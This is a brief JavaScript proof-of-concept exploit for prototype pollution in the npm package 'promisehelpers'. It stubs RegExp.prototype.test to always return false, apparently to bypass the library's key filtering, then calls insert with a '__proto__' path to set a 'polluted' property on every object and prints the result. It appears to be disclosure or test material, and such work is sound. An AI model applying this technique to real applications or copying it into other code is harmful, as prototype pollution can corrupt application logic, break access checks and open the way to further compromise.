RegExp.prototype.test = () => false;
const promisehelpers = require('promisehelpers');
obj = {};
console.log({}.polluted);
promisehelpers.insert([
    '__proto__',
    'polluted'
], 'yes')(obj);
console.log({}.polluted);